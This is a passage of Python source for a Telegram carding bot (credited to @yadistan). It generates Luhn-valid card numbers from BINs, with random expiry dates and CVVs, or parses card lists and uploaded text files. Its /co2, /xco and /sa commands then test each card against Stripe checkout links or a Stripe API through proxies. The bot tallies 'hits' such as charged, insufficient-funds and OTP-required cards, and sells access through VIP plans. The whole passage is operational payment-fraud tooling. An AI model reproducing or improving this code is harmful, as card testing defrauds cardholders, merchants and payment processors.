                replied_text = replied.text or replied.caption or ""
                for _rl in replied_text.splitlines():
                    c = _extract_cc(_rl.strip())
                    if c and c not in card_lines:
                        card_lines.append(c)

        # ── Parse remaining lines for cards or BIN ───────────────
        if not card_lines and remaining:
            for ln in remaining:
                c = _extract_cc(ln.strip())
                if c:
                    card_lines.append(c)

            # If no cards found, check if it's BIN mode
            if not card_lines and remaining:
                second_line = remaining[0]
                parts_s = second_line.split()
                first_tok = parts_s[0].split('|')[0].strip()
                digits_only = re.sub(r'[xX]', '', first_tok)
                if len(digits_only) >= 6 and digits_only.isdigit() and len(first_tok) < 13:
                    is_bin_mode = True
                    bin_input = parts_s[0]
                    bin_amount = int(parts_s[1]) if len(parts_s) > 1 and parts_s[1].isdigit() else 15
                    bin_amount = max(1, min(bin_amount, 100))

        # ── Also check reply for cards (no URL scenario) ─────────
        if not card_lines and not is_bin_mode and replied and replied.text:
            for ln in replied.text.strip().split("\n"):
                c = _extract_cc(ln.strip())
                if c:
                    card_lines.append(c)

        if not card_lines and not is_bin_mode:
            bot.reply_to(message, usage_msg, parse_mode="HTML")
            return

        # ── BIN MODE: generate cards ─────────────────────────────
        if is_bin_mode:
            has_pipe = '|' in bin_input
            if has_pipe:
                bp = bin_input.split('|')
                bin_base = bp[0].strip()
                mm_tpl = bp[1].strip() if len(bp) > 1 else 'xx'
                yy_tpl = bp[2].strip() if len(bp) > 2 else 'xx'
                cvv_tpl = bp[3].strip() if len(bp) > 3 else 'xxx'
            else:
                bin_base = bin_input.replace('x', '').replace('X', '')
                mm_tpl = yy_tpl = 'xx'
                cvv_tpl = 'xxx'

            if len(bin_base.replace('x', '').replace('X', '')) < 6:
                bot.reply_to(message, "<b>❌ BIN must be at least 6 digits.</b>", parse_mode='HTML')
                return

            is_amex = bin_base[0] == '3'
            clen = 15 if is_amex else 16
            cvv_len = 4 if is_amex else 3
            cur_yy = datetime.now().year % 100

            def _gen():
                cc = ''.join(str(random.randint(0,9)) if c.lower() == 'x' else c for c in bin_base)
                while len(cc) < clen - 1:
                    cc += str(random.randint(0,9))
                for d in range(10):
                    test = cc + str(d)
                    digits = [int(x) for x in test]
                    odd = digits[-1::-2]; even = digits[-2::-2]
                    if (sum(odd) + sum(sum(divmod(x*2,10)) for x in even)) % 10 == 0:
                        cc = test; break
                mm = str(random.randint(1,12)).zfill(2) if mm_tpl.lower().strip('x') == '' else mm_tpl.zfill(2)
                yy = str(random.randint(cur_yy+1, cur_yy+5)).zfill(2) if yy_tpl.lower().strip('x') == '' else yy_tpl.zfill(2)
                cvv = (str(random.randint(1000,9999)) if cvv_len==4 else str(random.randint(100,999)).zfill(3)) if cvv_tpl.lower().strip('x') == '' else cvv_tpl
                return f"{cc}|{mm}|{yy}|{cvv}"

            card_lines = []; seen = set(); att = 0
            while len(card_lines) < bin_amount and att < bin_amount * 10:
                c = _gen()
                if c not in seen:
                    seen.add(c); card_lines.append(c)
                att += 1

        card_lines = card_lines[:200]
        total = len(card_lines)
        log_command(message, query_type="gateway", gateway="co2")

        # ── Determine check function ─────────────────────────────
        use_link = checkout_url and checkout_url.startswith('http')

        def _check_card(cc):
            if use_link:
                return _co_ext_call(checkout_url, cc)
            else:
                return _co2_api_call(cc, proxy_dict_co2)

        # ── Shared state ─────────────────────────────────────────
        try:
            stopuser[f'{uid}']['status'] = 'start'
        except Exception:
            stopuser[f'{uid}'] = {'status': 'start'}

        live = dead = insufficient = three_ds = checked = 0
        hits = []
        results_lines = []

        bin_6 = card_lines[0].split("|")[0][:6]
        bin_info, bank, country, country_code = get_bin_info(bin_6)
        _flag_icon = _flag(country_code) if country_code not in ('N/A', '??', '', 'Unknown') else ''

        _gate_label = "Ext Stripe Checkout" if use_link else "Stripe PHP API"
        _mode_label = "BIN GEN" if is_bin_mode else ("TXT" if (replied and replied.document) else "CO2")

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))

        # ── Single card (no link, 1 card) → detailed view ────────
        if total == 1 and not is_bin_mode:
            card = card_lines[0]
            log_command(message, query_type='gateway', gateway='co2')
            msg = bot.reply_to(message,
                f"<b>⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...\n"
                f"{'🌐 𝗟𝗶𝗻𝗸: <code>' + checkout_url[:50] + '...</code>' + chr(10) if use_link else ''}"
                f"💳 𝗖𝗮𝗿𝗱: <code>{card}</code></b>", parse_mode='HTML')

            start_time = time.time()
            result = _check_card(card)
            execution_time = time.time() - start_time
            log_card_check(uid, card, 'co2', f"{result.get('status')} | {result.get('message')}", exec_time=execution_time)

            status_emoji = _co2_status(result)
            _raw_msg = result.get('message', '')
            _cc_show = country_code if country_code not in ('N/A','??','','Unknown') else ''
            _country_display = country if country != 'Unknown' else '—'
            _country_line = f"{_country_display} ({_cc_show})" if _cc_show else _country_display
            _bank_display = bank if bank != 'Unknown' else '—'
            _bin_display = bin_info if bin_info not in ('Unknown', 'Unknown - ') else '—'
            success_url = result.get('url', '')
            url_line = f"\n<b>Success URL:</b> <code>{success_url}</code>" if success_url else ""

            if status_emoji in ("✅", "💰", "⚠️"):
                _labels = {"✅": ("A P P R O V E D", "CHARGED  —  HIT !", "✅"),
                           "💰": ("I N S U F F I C I E N T", "INSUFFICIENT FUNDS", "💰"),
                           "⚠️": ("O T P   R E Q U I R E D", "3DS / OTP REQUIRED", "⚠️")}
                _top_t, _box_t, _box_e = _labels.get(status_emoji, _labels["✅"])
                formatted_message = (
                    f"<b>✨ ✦ ─── {_top_t} ─── ✦ ✨\n"
                    f"╔══════════════════════════╗\n"
                    f"║  {_box_e}  {_box_t}    ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│ 💳 <code>{card}</code>\n"
                    f"│ 💬 {_html.escape(_raw_msg[:60])} {status_emoji}\n"
                    f"│{url_line}\n"
                    f"│\n"
                    f"│ 🌐 Site: {_html.escape(result.get('merchant','N/A'))}\n"
                    f"│ 💵 Amount: {result.get('amount','N/A')}\n"
                    f"│\n"
                    f"│ 🏦 BIN: {_bin_display}\n"
                    f"│ 🏛️ Bank: {_bank_display}\n"
                    f"│ 🌍 Country: {_country_line}\n"
                    f"│\n"
                    f"│ 🎯 Gate: {_gate_label}\n"
                    f"│ ⏱️ {execution_time:.2f}s\n"
                    f"└──────────────────────────\n"
                    f"       ⌤ Bot by @yadistan</b>"
                )
            else:
                formatted_message = (
                    f"<b>— ─── D E C L I N E D ─── —\n"
                    f"╔══════════════════════════╗\n"
                    f"║  ❌  DEAD  —  DECLINED    ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│ 💳 <code>{card}</code>\n"
                    f"│ 💬 {_html.escape(_raw_msg[:60])}\n"
                    f"│\n"
                    f"│ 🏦 BIN: {_bin_display}\n"
                    f"│ 🏛️ Bank: {_bank_display}\n"
                    f"│ 🌍 Country: {_country_line}\n"
                    f"│\n"
                    f"│ 🎯 Gate: {_gate_label}\n"
                    f"│ ⏱️ {execution_time:.2f}s\n"
                    f"└──────────────────────────\n"
                    f"       ⌤ Bot by @yadistan</b>"
                )
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=formatted_message, reply_markup=kb, parse_mode='HTML')
            except:
                pass
            return

        # ── Multi-card / BIN mode ────────────────────────────────
        def _build_msg(status_text="⏳ Checking..."):
            pct = int(checked / total * 100) if total else 0
            bar_w = 12
            filled = int(bar_w * checked / total) if total else 0
            bar = '▓' * filled + '░' * (bar_w - filled)
            _cc_d = country_code if country_code not in ('N/A','??','','Unknown') else ''
            _cl = f"🌍 {_flag_icon} {country}" + (f"  ({_cc_d})" if _cc_d else "")
            _bi = bin_info if bin_info not in ('Unknown', 'Unknown - ') else '—'

            if "DONE" in status_text or "Complete" in status_text:
                _top = "✨ ✦ ─── C O 2   D O N E ─── ✦ ✨"
            elif "STOP" in status_text:
                _top = "🛑 ─── S T O P P E D ─── 🛑"
            else:
                _top = f"⚡ ════ CO2 × {_mode_label} ════ ⚡"

            header = (
                f"<b>{_top}\n"
                f"╔══════════════════════════╗\n"
                f"║  🌐  {_gate_label[:22]:<22}  ║\n"
                f"╚══════════════════════════╝\n"
                f"│ 🎯 BIN: <code>{bin_6}</code>  {_bi}\n"
                f"│ 🏦 {bank}  ·  {_cl}\n"
                f"│\n"
                f"│ [{bar}] {pct}%\n"
                f"│ 📊 {checked}/{total}  ┃  ✅ {live}  ┃  💰 {insufficient}  ┃  ⚠️ {three_ds}  ┃  ❌ {dead}\n"
                f"│  {status_text}\n"
                f"├──────────────────────────\n"
            )
            body = "\n".join(results_lines[-10:])
            footer_hits = ""
            if hits:
                _hlabels = {"✅": "✅ HIT (Paid)", "💰": "💰 HIT (Funds)", "⚠️": "⚠️ HIT (OTP)"}
                hits_block = "".join(
                    f"\n╔══ {_hlabels.get(em,'🎯 HIT')} ══╗\n"
                    f"│ <code>{cc}</code>\n"
                    f"│ 🌐 {res.get('merchant','N/A')}\n"
                    f"│ 💵 {res.get('amount','N/A')}\n"
                    f"└────────────\n"
                    for cc, res, em in hits[-6:]
                )
                footer_hits = f"\n🎯 <b>HITS ({len(hits)})</b>" + hits_block
            full = header + body + footer_hits + "\n✨ ✦ ─────────────── ✦ ✨\n       <i>⌤ Bot by @yadistan</i></b>"
            if len(full) > 4000:
                full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n       <i>⌤ @yadistan</i></b>"
            return full

        msg = bot.reply_to(message, _build_msg(), parse_mode="HTML", reply_markup=stop_kb)
        t0 = time.time()

        _live_hit_holder = [None, []]
        for card in card_lines:
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(_build_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"),
                        chat_id=msg.chat.id, message_id=msg.message_id, parse_mode="HTML")
                except:
                    pass
                return

            card = card.strip()
            result = _check_card(card)
            checked += 1
            log_card_check(uid, card, 'co2', f"{result.get('status')} | {result.get('message')}")

            status_emoji = _co2_status(result)
            if status_emoji == "✅":
                live += 1; hits.append((card, result, status_emoji))
                _add_to_merge(uid, card); _notify_live_hit(message.chat.id, card, "co2", holder=_live_hit_holder)
            elif status_emoji == "💰":
                insufficient += 1; hits.append((card, result, status_emoji))
                _add_to_merge(uid, card); _notify_live_hit(message.chat.id, card, "co2", holder=_live_hit_holder)
            elif status_emoji == "⚠️":
                three_ds += 1; hits.append((card, result, status_emoji))
            else:
                dead += 1

            _rmsg = (result.get('message','') or '')[:40]
            results_lines.append(
                f"{status_emoji} <b>{_co2_line(result)}</b>  ·  {_html.escape(_rmsg)}\n    └ <code>{card}</code>"
            )

            if checked % 3 == 0 or checked == total:
                try:
                    bot.edit_message_text(_build_msg(), chat_id=msg.chat.id, message_id=msg.message_id,
                                          parse_mode="HTML", reply_markup=stop_kb)
                    time.sleep(0.4)
                except Exception:
                    time.sleep(0.8)

        total_time = round(time.time() - t0, 1)
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
        try:
            bot.edit_message_text(_build_msg(f"✅ 𝗗𝗢𝗡𝗘  ·  ⏱️ {total_time}s"),
                chat_id=msg.chat.id, message_id=msg.message_id,
                parse_mode="HTML", reply_markup=kb)
        except:
            pass

    threading.Thread(target=my_function).start()



@bot.message_handler(commands=["xco"])
def xco_command(message):
    def my_function():
        uid  = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as f:
            jd = json.load(f)
        try:
            plan = jd[str(uid)]['plan']
        except Exception:
            plan = '𝗙𝗥𝗘𝗘'

        if plan == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        allowed, wait = check_rate_limit(uid, plan)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>", parse_mode='HTML')
            return

        usage_msg = (
            "<b>🌐 <u>𝗦𝗲𝗹𝗳-𝗛𝗼𝘀𝘁𝗲𝗱 𝗔𝗣𝗜 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁</u>\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Single Card:</b>\n"
            "<code>/xco https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>Multi-Card:</b>\n"
            "<code>/xco https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123\n"
            "5555555555554444|01|27|321</code>\n\n"
            "📌 <b>BIN Mode (auto-gen):</b>\n"
            "<code>/xco https://checkout.stripe.com/xxx\n"
            "411111 30</code>\n"
            "<i>(BIN amount — default 10, max 100)</i>\n"
            "━━━━━━━━━━━━━━━━</b>"
        )

        # ── Local card generator (same as /co) ──
        def luhn_check(card_number):
            digits = [int(d) for d in card_number]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            tot = sum(odd_digits)
            for d in even_digits:
                tot += sum(divmod(d * 2, 10))
            return tot % 10 == 0

        def _make_card(bin_base, mm_t, yy_t, cvv_t):
            is_amex   = bin_base[0] == '3'
            card_len  = 15 if is_amex else 16
            cvv_len   = 4  if is_amex else 3
            cc = ''
            for ch in bin_base:
                cc += str(random.randint(0, 9)) if ch.lower() == 'x' else ch
            while len(cc) < card_len - 1:
                cc += str(random.randint(0, 9))
            for chk in range(10):
                test = cc + str(chk)
                if luhn_check(test):
                    cc = test; break
            cur_yr = datetime.now().year % 100
            mm  = str(random.randint(1, 12)).zfill(2)   if mm_t.lower()  in ('xx','x','') else mm_t.zfill(2)
            yy  = str(random.randint(cur_yr+1, cur_yr+5)).zfill(2) if yy_t.lower() in ('xx','x','') else yy_t.zfill(2)
            cvv = (str(random.randint(1000,9999)) if is_amex else str(random.randint(100,999)).zfill(3)) if cvv_t.lower() in ('xxx','xxxx','xx','x','') else cvv_t.zfill(cvv_len)
            return f"{cc}|{mm}|{yy}|{cvv}"

        parts_cmd = message.text.strip().split()

        # ── TXT FILE REPLY MODE ──
        replied = message.reply_to_message
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):

            if len(parts_cmd) < 2:
                bot.reply_to(message,
                    "<b>❌ Usage: <code>/xco https://checkout.stripe.com/xxx</code> → (txt pe reply karein)</b>",
                    parse_mode='HTML')
                return
            checkout_url = parts_cmd[1].strip()
            try:
                file_info = bot.get_file(replied.document.file_id)
                raw_bytes = bot.download_file(file_info.file_path)
                file_lines = raw_bytes.decode('utf-8', errors='ignore').splitlines()
            except Exception as e:
                bot.reply_to(message, f"<b>❌ File read error: {e}</b>", parse_mode='HTML')
                return

            cc_list = [l.strip() for l in file_lines
                       if re.match(r'\d{13,19}[\|/]\d{1,2}[\|/]\d{2,4}[\|/]\d{3,4}', l.strip())]
            if not cc_list:
                bot.reply_to(message, "<b>❌ Koi valid card nahi mili file mein.</b>", parse_mode='HTML')
                return

            msg = bot.reply_to(message,
                f"<b>📄 TXT | 𝗘𝘅𝘁 𝗔𝗣𝗜\n⏳ Checking {len(cc_list)} cards...</b>", parse_mode='HTML')
            hits_txt, dead_txt, live_txt = [], 0, 0
            for cc in cc_list:
                if stopuser.get(str(uid), {}).get('status') == 'stop':
                    break
                emoji, resp = _xco_call(checkout_url, cc)
                if emoji in ("✅", "💰"):
                    hits_txt.append(_fmt_xco_line(emoji, cc, resp))
                    live_txt += 1
                else:
                    dead_txt += 1
            summary = (
                f"<b>✨ ✦ ─── X C O   T X T   D O N E ─── ✦ ✨\n"
                f"╔══════════════════════════╗\n"
                f"║  📄  XCO Txt Scan Done   ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│ ✅ Hits: {live_txt}   💀 Dead: {dead_txt}\n"
                f"│\n"
                + ("\n".join(hits_txt) if hits_txt else "│ ❌ No hits found.") + "\n"
                f"└──────────────────────────\n"
                f"       ⌤ @yadistan</b>"
            )
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=summary, reply_markup=kb, parse_mode='HTML')
            except Exception:
                bot.reply_to(message, summary, parse_mode='HTML')
            return

        # ── Parse URL + card/BIN ──
        # Supported formats:
        #   /xco URL\nCARD         (URL on same line as command)
        #   /xco\nURL\nCARD        (URL on next line — .xco style)
        #   /xco URL CARD          (all on one line)
        try:
            lines_raw    = [l.strip() for l in message.text.split('\n') if l.strip()]
            first_tokens = lines_raw[0].split(None, 1)   # ['/xco', rest_or_nothing]
            first_rest   = first_tokens[1].strip() if len(first_tokens) > 1 else ''

            if first_rest.startswith('http'):
                # /xco URL ...\n CARD(s)
                checkout_url = first_rest.split()[0]
                remaining    = lines_raw[1:]
                # anything after URL on same token line
                after_url = first_rest[len(checkout_url):].strip()
                if after_url:
                    remaining = [after_url] + remaining
            elif len(lines_raw) > 1 and lines_raw[1].startswith('http'):
                # /xco\nURL\nCARD(s)  — .xco style
                checkout_url = lines_raw[1].split()[0]
                remaining    = lines_raw[2:]
            else:
                raise IndexError

            if not remaining:
                raise IndexError

            second_line = remaining[0]
            extra_lines = remaining[1:]
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        if not checkout_url.startswith('http'):
            bot.reply_to(message,
                "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸. Stripe checkout URL paste karein.</b>",
                parse_mode='HTML')
            return

        # ── Detect mode: Card or BIN ──
        first_token = second_line.split('|')[0].strip().split()[0]
        is_card = (len(first_token) >= 13 and first_token.isdigit()) or (_extract_cc(second_line) is not None)

        if is_card:
            # ── CARD / MULTI-CARD MODE ──
            _raw_xco = [second_line] + extra_lines
            card_lines = []
            for _rl in _raw_xco:
                _cc = _extract_cc(_rl.strip())
                if _cc:
                    card_lines.append(_cc)
            card_lines = card_lines[:10]
            if not card_lines:
                bot.reply_to(message, usage_msg, parse_mode='HTML')
                return

            if len(card_lines) == 1:
                # ── SINGLE CARD ──
                cc  = card_lines[0]
                msg = bot.reply_to(message,
                    f"<b>🌐 𝗫𝗖𝗢 | ⏳ Checking...\n💳 <code>{cc}</code></b>",
                    parse_mode='HTML')
                emoji, resp = _xco_call(checkout_url, cc)
                if emoji == "✅":
                    _xco_top = "✨ ✦ ─── A P P R O V E D ─── ✦ ✨"
                    _xco_box = "║  ✅  XCO  —  H I T !       ║"
                elif emoji == "💰":
                    _xco_top = "✨ ✦ ─── A P P R O V E D ─── ✦ ✨"
                    _xco_box = "║  💰  XCO  INSUFFICIENT     ║"
                elif emoji == "⚠️":
                    _xco_top = "⚠️ ─── 3 D S   R E Q U I R E D ─── ⚠️"
                    _xco_box = "║  ⚠️  XCO  3DS / OTP        ║"
                elif emoji == "🚫":
                    _xco_top = "🚫 ─── E X P I R E D   U R L ─── 🚫"
                    _xco_box = "║  🚫  XCO  EXPIRED URL      ║"
                elif emoji == "🤖":
                    _xco_top = "🤖 ─── C A P T C H A ─── 🤖"
                    _xco_box = "║  🤖  XCO  hCAPTCHA         ║"
                else:
                    _xco_top = "— ─── D E C L I N E D ─── —"
                    _xco_box = "║  ❌  XCO  DECLINED         ║"
                result_text = (
                    f"<b>{_xco_top}\n"
                    f"╔══════════════════════════╗\n"
                    f"{_xco_box}\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│ {_fmt_xco_line(emoji, cc, resp)}\n"
                    f"└──────────────────────────\n"
                    f"       ⌤ Bot by @yadistan</b>"
                )
                kb = types.InlineKeyboardMarkup()
                kb.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=result_text, reply_markup=kb, parse_mode='HTML')
                except Exception:
                    bot.reply_to(message, result_text, parse_mode='HTML')
                return

            # ── MULTI CARD ──
            total    = len(card_lines)
            checked  = 0
            live_m, dead_m = 0, 0
            results_m = []   # all card lines
            hits_m    = []   # hits only
            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton("🛑 Stop", callback_data='stop'))

            def build_multi(status="⏳ Checking..."):
                bar_done  = "▓" * min(checked, 10)
                bar_empty = "░" * max(0, 10 - min(checked, 10))
                pct       = int(checked / total * 100) if total else 0
                if "DONE" in status:
                    _top = "✨ ✦ ─── X C O   D O N E ─── ✦ ✨"
                elif "STOP" in status:
                    _top = "🛑 ─── S T O P P E D ─── 🛑"
                else:
                    _top = "✨ ✦ ─── X C O   M U L T I ─── ✦ ✨"
                hdr = (
                    f"<b>{_top}\n"
                    f"╔══════════════════════════╗\n"
                    f"║  ⚡  XCO Multi Scan       ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│ [{bar_done}{bar_empty}] {pct}%  ({checked}/{total})  {status}\n"
                    f"│ ✅ Hits: {live_m}   💀 Dead: {dead_m}\n"
                    f"└──────────────────────────\n"
                )
                body = "\n".join(results_m[-8:])
                hits_section = ""
                if hits_m:
                    hits_section = "\n🎯 <b>HITS:</b>\n" + "\n".join(hits_m)
                return hdr + body + hits_section + "\n✨ ✦ ─────────────── ✦ ✨\n       ⌤ @yadistan</b>"

            msg = bot.reply_to(message, build_multi(), reply_markup=stop_kb, parse_mode='HTML')
            _expired_abort  = False
            _captcha_abort  = False
            _live_hit_holder = [None, []]
            for cc in card_lines:
                if stopuser.get(str(uid), {}).get('status') == 'stop':
                    break
                emoji, resp = _xco_call(checkout_url, cc)
                checked += 1
                line = _fmt_xco_line(emoji, cc, resp)
                results_m.append(line)
                if emoji in ("✅", "💰"):
                    live_m += 1
                    hits_m.append(line)
                    _add_to_merge(uid, cc)
                    _notify_live_hit(message.chat.id, cc, "xco", holder=_live_hit_holder)
                elif emoji == "🚫":
                    dead_m += 1
                    _expired_abort = True
                    break
                elif emoji == "🤖":
                    dead_m += 1
                    _captcha_abort = True
                    break
                else:
                    dead_m += 1
                if checked % 2 == 0 or checked == total:
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_multi(), reply_markup=stop_kb, parse_mode='HTML')
                    except Exception:
                        pass
            fin_kb = types.InlineKeyboardMarkup()
            fin_kb.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))
            if _expired_abort:
                _status_txt = "🚫 URL EXPIRED — Scan stopped"
            elif _captcha_abort:
                _status_txt = "🤖 hCAPTCHA DETECTED — Scan stopped"
            else:
                _status_txt = "✅ Completed!"
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_multi(_status_txt), reply_markup=fin_kb, parse_mode='HTML')
            except Exception:
                pass
            return

        # ── BIN MODE ──
        second_parts = second_line.split()
        bin_input    = second_parts[0]
        amount       = int(second_parts[1]) if len(second_parts) > 1 and second_parts[1].isdigit() else 10
        amount       = max(1, min(amount, 100))

        has_pipe = '|' in bin_input
        if has_pipe:
            bp = bin_input.split('|')
            bin_base  = bp[0].strip()
            mm_t      = bp[1].strip() if len(bp) > 1 else 'xx'
            yy_t      = bp[2].strip() if len(bp) > 2 else 'xx'
            cvv_t     = bp[3].strip() if len(bp) > 3 else 'xxx'
        else:
            bin_base = bin_input.replace('x','').replace('X','')
            mm_t, yy_t, cvv_t = 'xx', 'xx', 'xxx'

        if len(bin_base.replace('x','').replace('X','')) < 6:
            bot.reply_to(message, "<b>❌ BIN must be at least 6 digits.</b>", parse_mode='HTML')
            return

        cards = []
        seen  = set()
        for _ in range(amount * 5):
            if len(cards) >= amount:
                break
            c = _make_card(bin_base, mm_t, yy_t, cvv_t)
            if c not in seen:
                seen.add(c); cards.append(c)

        total    = len(cards)
        bin_num  = bin_base[:6]
        bin_info, bank, country, _ = get_bin_info(bin_num)
        checked_b, live_b, dead_b = 0, 0, 0
        results_b = []   # all card lines (hits + dead)
        hits_b    = []   # hit cards only (for final summary)

        try:
            stopuser[str(uid)]['status'] = 'start'
        except Exception:
            stopuser[str(uid)] = {'status': 'start'}

        stop_kb2 = types.InlineKeyboardMarkup()
        stop_kb2.add(types.InlineKeyboardButton("🛑 Stop", callback_data='stop'))

        def build_bin(status="⏳ Checking..."):
            bar_done  = "▓" * min(checked_b, 10)
            bar_empty = "░" * max(0, 10 - min(checked_b, 10))
            pct       = int(checked_b / total * 100) if total else 0
            hdr = (
                f"<b>⚡️ 𝗫𝗖𝗢 𝗕𝗜𝗡 𝗦𝗰𝗮𝗻𝗻𝗲𝗿  {status}\n"
                f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
                f"🎴 𝗕𝗜𝗡 »  <code>{bin_num}</code>  |  {bin_info}\n"
                f"[{bar_done}{bar_empty}] {pct}%  ({checked_b}/{total})\n"
                f"✅ {live_b}  💀 {dead_b}  🔢 {checked_b}\n"
                f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
            )
            body = "\n".join(results_b[-8:])
            hits_section = ""
            if hits_b:
                hits_section = (
                    "\n┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
                    "🏆 𝗛𝗜𝗧𝗦:\n"
                    + "\n".join(hits_b)
                )
            return hdr + body + hits_section + "\n┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n[⌤] @yadistan</b>"

        log_command(message, query_type='gateway', gateway='xco_bin')
        msg = bot.reply_to(message, build_bin(), reply_markup=stop_kb2, parse_mode='HTML')

        for cc in cards:
            if stopuser.get(str(uid), {}).get('status') == 'stop':
                break
            emoji, resp = _xco_call(checkout_url, cc)
            checked_b += 1
            line = _fmt_xco_line(emoji, cc, resp)
            results_b.append(line)
            if emoji in ("✅", "💰"):
                live_b += 1
                hits_b.append(line)
            else:
                dead_b += 1
            if checked_b % 2 == 0 or checked_b == total:
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_bin(), reply_markup=stop_kb2, parse_mode='HTML')
                except Exception:
                    pass

        fin_kb2 = types.InlineKeyboardMarkup()
        fin_kb2.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=build_bin("✅ Completed!"), reply_markup=fin_kb2, parse_mode='HTML')
        except Exception:
            pass

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Stripe Auth Command ==================
@bot.message_handler(commands=["sa"])
def stripe_auth_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return
        
        card = _get_card_from_message(message)
        if not card:
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/sa 4111111111111111|12|25|123\n\n<i>💡 Tip: Can also reply to a message containing cards</i></b>")
            return
        
        log_command(message, query_type='gateway', gateway='stripe_auth')
        proxy = get_proxy_dict(id)
        msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱 𝘄𝗶𝘁𝗵 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵... ⏳</b>")
        
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        
        start_time = time.time()
        result = stripe_auth(card, proxy)
        execution_time = time.time() - start_time
        log_card_check(id, card, 'stripe_auth', result, exec_time=execution_time)
        
        if "Approved" in result:
            status_emoji = "✅"
        elif "Insufficient" in result:
            status_emoji = "💰"
        else:
            status_emoji = "❌"
        
        minux_keyboard = types.InlineKeyboardMarkup()
        minux_button = types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan")
        minux_keyboard.add(minux_button)
        
        formatted_message = f"""<b>#stripe_auth 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
